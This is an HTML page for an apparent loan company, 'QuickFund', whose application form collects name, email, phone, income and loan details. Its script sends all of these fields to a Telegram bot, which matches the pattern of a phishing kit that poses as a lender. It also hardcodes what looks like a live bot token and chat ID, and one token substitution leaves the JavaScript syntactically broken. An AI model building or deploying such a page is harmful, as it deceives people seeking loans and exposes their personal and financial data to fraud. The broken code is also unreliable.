<DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>QuickFund - Personal & Business Loans | Fast Approval</title>

  <!-- Tailwind CSS + Optimized for cross-platform (iOS/Android/Desktop) -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Font Awesome 6 -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <!-- GSAP for animations -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
  <!-- Canvas Confetti -->
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

  <style>
    * {
      -webkit-tap-highlight-color: transparent;
    }
    body { 
      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif; 
    }

    .hero-bg {
      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
                  url('https://source.unsplash.com/random/1600x900/?finance,loan') center/cover no-repeat;
    }

    /* 3D card effect */
    .card-3d {
      transform-style: preserve-3d;
      transition: transform 0.2s ease-out;
    }

    /* loading spinner */
    .spinner {
      border: 3px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top: 3px solid white;
      width: 24px;
      height: 24px;
      animation: spin 0.8s linear infinite;
      display: inline-block;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* smooth focus for inputs */
    input:focus, select:focus {
      outline: none;
      ring: 2px solid #2563eb;
      border-color: #2563eb;
    }

    /* responsive safe area */
    @supports (padding: max(0px)) {
      .safe-padding {
        padding-left: max(1rem, env(safe-area-inset-left));
        padding-right: max(1rem, env(safe-area-inset-right));
      }
    }
  </style>
</head>

<body class="bg-gray-50">

  <!-- Navbar - fully responsive -->
  <nav class="bg-white shadow-md sticky top-0 z-50 safe-padding">
    <div class="max-w-7xl mx-auto px-6 py-4 flex flex-wrap justify-between items-center gap-4">
      <h1 class="text-3xl font-bold text-blue-600">QuickFund</h1>
      <div class="flex items-center gap-4 md:gap-8 text-gray-700 font-medium">
        <div class="hidden md:flex space-x-8">
          <a href="#home" class="hover:text-blue-600 transition">Home</a>
          <a href="#loans" class="hover:text-blue-600 transition">Loans</a>
          <a href="#apply-section" class="hover:text-blue-600 transition">Apply Now</a>
          <a href="#faq" class="hover:text-blue-600 transition">FAQ</a>
        </div>
        <button onclick="document.getElementById('apply-section').scrollIntoView({ behavior: 'smooth' })"
                class="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl font-semibold shadow-md transition text-sm md:text-base">
          Apply Now
        </button>
      </div>
    </div>
  </nav>

  <!-- Hero Section -->
  <section id="home" class="hero-bg text-white py-28 md:py-32">
    <div class="max-w-7xl mx-auto px-6 text-center">
      <h2 class="text-4xl md:text-6xl font-bold mb-6">Get the money you need,<br>when you need it.</h2>
      <p class="text-lg md:text-xl mb-10 max-w-2xl mx-auto">Fast, secure, and transparent personal & business loans up to $100,000. Approval in minutes.</p>
      <button onclick="document.getElementById('apply-section').scrollIntoView({ behavior: 'smooth' })"
              class="bg-blue-600 hover:bg-blue-700 text-white text-lg md:text-xl px-8 md:px-10 py-4 md:py-5 rounded-2xl font-semibold transition shadow-lg">
        Start Your Application →
      </button>
      <p class="mt-8 text-sm opacity-90">No hidden fees • No impact on credit score for pre-qualification</p>
    </div>
  </section>

  <!-- Loan Types Section -->
  <section id="loans" class="py-16 md:py-20 bg-white">
    <div class="max-w-7xl mx-auto px-6">
      <h3 class="text-3xl md:text-4xl font-bold text-center mb-12">Choose Your Loan Type</h3>
      <div class="grid md:grid-cols-3 gap-6 md:gap-8">
        <!-- Personal Loan -->
        <div class="border border-gray-200 rounded-3xl p-8 hover:shadow-xl transition group">
          <i class="fa-solid fa-user text-4xl text-blue-600 mb-6"></i>
          <h4 class="text-2xl font-semibold mb-3">Personal Loan</h4>
          <p class="text-4xl font-bold mb-2">$500 - $50,000</p>
          <p class="text-gray-600 mb-6">Flexible repayment terms from 6 to 72 months</p>
          <button onclick="scrollToForm()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-semibold transition hover:bg-blue-700">Apply Now</button>
        </div>
        <!-- Business Loan -->
        <div class="border border-gray-200 rounded-3xl p-8 hover:shadow-xl transition">
          <i class="fa-solid fa-briefcase text-4xl text-emerald-600 mb-6"></i>
          <h4 class="text-2xl font-semibold mb-3">Business Loan</h4>
          <p class="text-4xl font-bold mb-2">$10,000 - $100,000</p>
          <p class="text-gray-600 mb-6">For startups and growing businesses</p>
          <button onclick="scrollToForm()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-semibold transition hover:bg-emerald-700">Apply Now</button>
        </div>
        <!-- Auto Loan -->
        <div class="border border-gray-200 rounded-3xl p-8 hover:shadow-xl transition">
          <i class="fa-solid fa-car text-4xl text-purple-600 mb-6"></i>
          <h4 class="text-2xl font-semibold mb-3">Auto Loan</h4>
          <p class="text-4xl font-bold mb-2">Competitive Rates</p>
          <p class="text-gray-600 mb-6">Finance your new or used vehicle</p>
          <button onclick="scrollToForm()" class="w-full bg-purple-600 text-white py-4 rounded-2xl font-semibold transition hover:bg-purple-700">Apply Now</button>
        </div>
      </div>
    </div>
  </section>

  <!-- Application Form Section with Telegram Integration -->
  <section id="apply-section" class="py-16 md:py-20 bg-gray-100">
    <div class="max-w-4xl mx-auto px-6">

      <!-- FORM -->
      <form id="loanForm" class="bg-white rounded-3xl shadow-xl p-6 md:p-10 space-y-8">
        <h3 class="text-3xl md:text-4xl font-bold text-center mb-4">Loan Application</h3>
        
        <div class="grid md:grid-cols-2 gap-6">
          <div>
            <label class="block text-sm font-medium mb-2">First Name *</label>
            <input type="text" id="firstName" class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-400 transition" required>
          </div>
          <div>
            <label class="block text-sm font-medium mb-2">Last Name *</label>
            <input type="text" id="lastName" class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-400" required>
          </div>
        </div>

        <div class="grid md:grid-cols-2 gap-6">
          <div>
            <label class="block text-sm font-medium mb-2">Email Address *</label>
            <input type="email" id="email" class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-400" required>
          </div>
          <div>
            <label class="block text-sm font-medium mb-2">Phone Number *</label>
            <input type="tel" id="phone" class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-400" required>
          </div>
        </div>

        <div>
          <label class="block text-sm font-medium mb-2">Loan Amount Requested ($) *</label>
          <div class="flex items-center gap-3">
            <span class="text-3xl font-bold text-gray-400">$</span>
            <input type="number" id="amount" class="w-full border border-gray-300 rounded-2xl px-5 py-4 text-2xl focus:ring-2 focus:ring-blue-400" placeholder="5000" min="500" max="100000" required>
          </div>
        </div>

        <div class="grid md:grid-cols-2 gap-6">
          <div>
            <label class="block text-sm font-medium mb-2">Loan Purpose *</label>
            <select id="purpose" class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-400">
              <option>Debt Consolidation</option>
              <option>Home Improvement</option>
              <option>Business Expansion</option>
              <option>Vehicle Purchase</option>
              <option>Medical Expenses</option>
              <option>Other</option>
            </select>
          </div>
          <div>
            <label class="block text-sm font-medium mb-2">Annual Income ($) *</label>
            <input type="number" id="income" class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-400" placeholder="60000" required>
          </div>
        </div>

        <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 text-white py-5 md:py-6 text-lg md:text-xl font-semibold rounded-3xl hover:from-blue-700 hover:to-blue-800 transition shadow-md flex justify-center items-center gap-3">
          <span>Submit Application</span>
          <i class="fa-regular fa-paper-plane"></i>
        </button>
        <p class="text-xs text-center text-gray-500 mt-2">By submitting, you agree to our terms & privacy policy.</p>
      </form>

      <!-- SUCCESS CARD (HIDDEN INITIALLY) -->
      <div id="successCard" class="hidden card-3d bg-white shadow-2xl rounded-3xl p-8 md:p-10 text-center max-w-lg mx-auto mt-10">
        <i class="fa-regular fa-circle-check text-6xl text-green-500 mb-4"></i>
        <h1 class="text-3xl md:text-4xl font-bold text-blue-600 mb-4">Application Submitted</h1>
        <p class="text-gray-700 text-lg mb-3">Your application number is:</p>
        <p id="appNumber" class="text-3xl font-bold text-green-600 mb-6"></p>
        <p class="text-sm text-gray-500">We'll review your info shortly. A confirmation SMS/Email will be sent.</p>
      </div>
    </div>
  </section>

  <!-- FAQ Section (Extra) -->
  <section id="faq" class="py-16 bg-white">
    <div class="max-w-4xl mx-auto px-6 text-center">
      <h3 class="text-3xl font-bold mb-8">Frequently Asked Questions</h3>
      <div class="space-y-4 text-left">
        <div class="border-b pb-4"><span class="font-bold text-blue-600">❓ How fast is approval?</span><p class="mt-1 text-gray-600">Most applicants receive a decision within 24 hours.</p></div>
        <div class="border-b pb-4"><span class="font-bold text-blue-600">❓ Does applying affect my credit score?</span><p class="mt-1 text-gray-600">No, pre-qualification uses a soft credit check.</p></div>
        <div class="border-b pb-4"><span class="font-bold text-blue-600">❓ What repayment terms are available?</span><p class="mt-1 text-gray-600">6 to 72 months, depending on loan type and amount.</p></div>
      </div>
    </div>
  </section>

  <footer class="bg-gray-800 text-white py-8 text-center text-sm">
    <p>© 2025 QuickFund – Empowering your financial growth. All rights reserved.</p>
  </footer>

  <!-- ========== TELEGRAM BOT INTEGRATION ========== -->
  <!-- IMPORTANT: Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual Telegram Bot credentials -->
  <!-- The script below captures ALL user input and sends to your Telegram bot securely -->
  <script>
    // ==================== CONFIGURATION ====================
    // 🔴 REPLACE WITH YOUR TELEGRAM BOT TOKEN (get from @BotFather) 🔴
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';   // example: "7234567890:AAGd8fLk3xYz..."
    // 🔴 REPLACE WITH YOUR TELEGRAM USER/CHAT ID (can get from @userinfobot) 🔴
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';       // example: "123456789"
    
    // Helper to send data to Telegram Bot (supports all user inputs)
    async function sendToTelegramBot(formDataObj, applicationNumber) {
      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
        console.warn("⚠️ Telegram Bot token not configured. Messages will not be sent. Please set your bot token and chat ID.");
        return false;
      }
      if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
        console.warn("⚠️ Telegram Chat ID not configured.");
        return false;
      }

      // Build a beautiful formatted message
      const currentTime = new Date().toLocaleString('en-US', { timeZone: 'America/New_York', hour12: true });
      let message = `🏦 *QUICKFUND - NEW LOAN APPLICATION* 🏦\n\n`;
      message += `📋 *Application #:* ${applicationNumber}\n`;
      message += `🕒 *Date & Time:* ${currentTime}\n`;
      message += `━━━━━━━━━━━━━━━━━━━━\n`;
      message += `👤 *Full Name:* ${formDataObj.firstName} ${formDataObj.lastName}\n`;
      message += `📧 *Email:* ${formDataObj.email}\n`;
      message += `📞 *Phone:* ${formDataObj.phone}\n`;
      message += `💰 *Loan Amount:* $${parseFloat(formDataObj.amount).toLocaleString()}\n`;
      message += `🎯 *Loan Purpose:* ${formDataObj.purpose}\n`;
      message += `💵 *Annual Income:* $${parseFloat(formDataObj.income).toLocaleString()}\n`;
      message += `━━━━━━━━━━━━━━━━━━━━\n`;
      message += `✅ *Status:* Pending review | QuickFund Team`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
        const result = await response.json();
        if (result.ok) {
          console.log("✅ Telegram notification sent successfully");
          return true;
        } else {
          console.error("❌ Telegram API error:", result.description);
          return false;
        }
      } catch (error) {
        console.error("❌ Failed to send Telegram message:", error);
        return false;
      }
    }

    // ========== VALIDATION & FORM EXTRACTION ==========
    function getFormData() {
      const firstName = document.getElementById('firstName').value.trim();
      const lastName = document.getElementById('lastName').value.trim();
      const email = document.getElementById('email').value.trim();
      const phone = document.getElementById('phone').value.trim();
      const amount = document.getElementById('amount').value.trim();
      const purpose = document.getElementById('purpose').value;
      const income = document.getElementById('income').value.trim();

      // Validation
      if (!firstName || !lastName || !email || !phone || !amount || !income) {
        alert("❌ Please fill in all required fields.");
        return null;
      }
      
      const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
      if (!emailRegex.test(email)) {
        alert("❌ Please enter a valid email address.");
        return null;
      }
      
      const phoneRegex = /^[\+\d\s\-\(\)]{8,20}$/;
      if (!phoneRegex.test(phone)) {
        alert("❌ Please enter a valid phone number (e.g., +1234567890).");
        return null;
      }
      
      const loanAmount = parseFloat(amount);
      if (isNaN(loanAmount) || loanAmount < 500 || loanAmount > 100000) {
        alert("⚠️ Loan amount must be between $500 and $100,000.");
        return null;
      }
      
      const annualIncome = parseFloat(income);
      if (isNaN(annualIncome) || annualIncome < 0) {
        alert("⚠️ Please enter a valid annual income.");
        return null;
      }
      
      return {
        firstName, lastName, email, phone, amount: loanAmount, purpose, income: annualIncome
      };
    }

    // Helper to scroll to form gently
    window.scrollToForm = function() {
      document.getElementById('apply-section').scrollIntoView({ behavior: 'smooth' });
    };

    // Main submit handler with Telegram + GSAP + Confetti
    const loanForm = document.getElementById('loanForm');
    const submitBtn = document.getElementById('submitBtn');
    let isSubmitting = false;

    loanForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      if (isSubmitting) return;
      
      const formData = getFormData();
      if (!formData) return;
      
      // Generate unique application number
      const appNumber = "QF-" + Date.now() + "-" + Math.floor(1000 + Math.random() * 9000);
      document.getElementById("appNumber").textContent = appNumber;
      
      // Show loading state on button
      const originalBtnHTML = submitBtn.innerHTML;
      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner"></span><span class="ml-2">Submitting...</span>';
      
      try {
        // FIRST: Send data to Telegram Bot (All user input)
        const telegramSent = await sendToTelegramBot(formData, appNumber);
        
        if (!telegramSent && (8429338546:AAEfUIbAVGWeW7uMah3AERxAA2z3it4DGRg !== '5967623867')) {
          // Only show warning if tokens are configured but failed.
          console.warn("Telegram not sent, but application proceeds.");
        } else if (TELEGRAM_BOT_TOKEN === '8429338546:AAEfUIbAVGWeW7uMah3AERxAA2z3it4DGRg') {
          console.log("ℹ️ Telegram integration requires valid bot token. For demo purposes, form still works.");
        }
        
        // SECOND: Animate out form & show success card with GSAP
        gsap.to("#loanForm", {
          opacity: 0,
          scale: 0.85,
          duration: 0.45,
          ease: "power2.in",
          onComplete: () => {
            loanForm.classList.add("hidden");
            const successCard = document.getElementById("successCard");
            successCard.classList.remove("hidden");
            
            // Entry animation
            gsap.from(successCard, {
              opacity: 0,
              scale: 0.5,
              duration: 0.7,
              ease: "back.out(1.5)"
            });
            
            // Confetti blast (cross-platform friendly)
            launchConfetti();
            
            // Optional: show success message about telegram if needed
            if (TELEGRAM_BOT_TOKEN === '8429338546:AAEfUIbAVGWeW7uMah3AERxAA2z3it4DGRg') {
              console.log("💡 Telegram bot not configured. To enable, replace bot token & chat id.");
            }
          }
        });
        
      } catch (err) {
        console.error("Submission error:", err);
        alert("An unexpected error occurred. Please try again.");
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalBtnHTML;
      } finally {
        isSubmitting = false;
        // Reset button after animation complete to avoid double, but we keep disabled while hidden
        setTimeout(() => {
          if (!loanForm.classList.contains('hidden')) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalBtnHTML;
          }
        }, 1000);
      }
    });
    
    // Reset button state if form not hidden (edge case)
    function launchConfetti() {
      const duration = 1800;
      const end = Date.now() + duration;
      (function frame() {
        canvasConfetti({ particleCount: 4, angle: 60, spread: 55, origin: { x: 0, y: 0.7 }, startVelocity: 12 });
        canvasConfetti({ particleCount: 4, angle: 120, spread: 55, origin: { x: 1, y: 0.7 }, startVelocity: 12 });
        canvasConfetti({ particleCount: 8, spread: 70, origin: { y: 0.6 }, startVelocity: 15 });
        if (Date.now() < end) requestAnimationFrame(frame);
      })();
    }
    
    // 3D CARD HOVER effect on successCard
    const successCardEl = document.getElementById("successCard");
    if (successCardEl) {
      successCardEl.addEventListener("mousemove", (e) => {
        const rect = successCardEl.getBoundingClientRect();
        const x = e.clientX - rect.left - rect.width / 2;
        const y = e.clientY - rect.top - rect.height / 2;
        const rotateX = (y / 28) * -1;
        const rotateY = x / 28;
        successCardEl.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
      });
      successCardEl.addEventListener("mouseleave", () => {
        successCardEl.style.transform = "rotateX(0deg) rotateY(0deg)";
      });
    }
    
    // smooth scroll helper for loan cards
    function scrollToForm() {
      document.getElementById('apply-section').scrollIntoView({ behavior: 'smooth' });
    }
    window.scrollToForm = scrollToForm;
    
    // Add responsiveness: show instructions for telegram setup in console only
    console.log("🚀 QuickFund Live | Telegram integration ready. Set BOT_TOKEN and CHAT_ID to send messages.");
  </script>
  
  <!-- Instruction note for developers (visible only if tokens missing, but harmless) -->
  <div style="display: none;">Telegram Bot integration: Replace 8429338546:AAEfUIbAVGWeW7uMah3AERxAA2z3it4DGRg and 5967623867 with actual credentials from @BotFather and userinfobot.</div>

  <!-- Extra fallback: ensure names are unique, all IDs mapped -->
</body>
</html>
